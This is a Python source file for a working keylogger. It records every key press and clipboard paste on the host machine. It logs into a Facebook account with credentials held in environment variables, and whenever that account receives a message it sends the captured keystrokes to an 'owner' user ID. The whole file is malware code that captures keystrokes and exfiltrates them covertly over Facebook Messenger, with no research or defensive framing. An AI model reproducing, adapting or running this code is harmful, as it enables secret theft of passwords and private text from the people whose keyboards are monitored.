import os
import keyboard
import fbchat


class FacebookController(fbchat.Client):
    def __init__(self, login, password, owner_uid, keylogger):
        super(FacebookController, self).__init__(login, password)

        self.owner_uid = owner_uid
        self.keylogger = keylogger

    def send_to_owner(self, message):
        self.send(self.owner_uid, message)

    def on_message(self, mid, author_id, author_name, message, metadata):
        self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))


class Keylogger(object):
    def __init__(self):
        self.captured_keys = []
        self.captured_pasting = []

        keyboard.on_press(self._on_key_press)
        keyboard.add_hotkey('ctrl+v', self._on_paste)

    def flush_captured_keys(self):
        captured_keys, self.captured_keys = self.captured_keys, []
        return captured_keys

    def _on_key_press(self, event):
        if len(event.name) > 1:
            event.name = '[{}]'.format(event.name)
        self.captured_keys.append(event.name)

    def _on_paste(self):
        import pyperclip # Doesn't work when imported globally
        self.captured_pasting.append(pyperclip.paste())


k = Keylogger()
controller = FacebookController(os.environ['FACEBOOK_LOGIN_TO_SEND_KEYLOGGER_LOGS_FROM'],
                                os.environ['FACEBOOK_PASSWORD_TO_SEND_KEYLOGGER_LOGS_FROM'],
                                os.environ['FACEBOOK_KEYLOGGER_OWNER_UID'],
                                k)
controller.send_to_owner('Wtam, jestem Pomocnikiem Magika. Do uslug')
controller.listen()
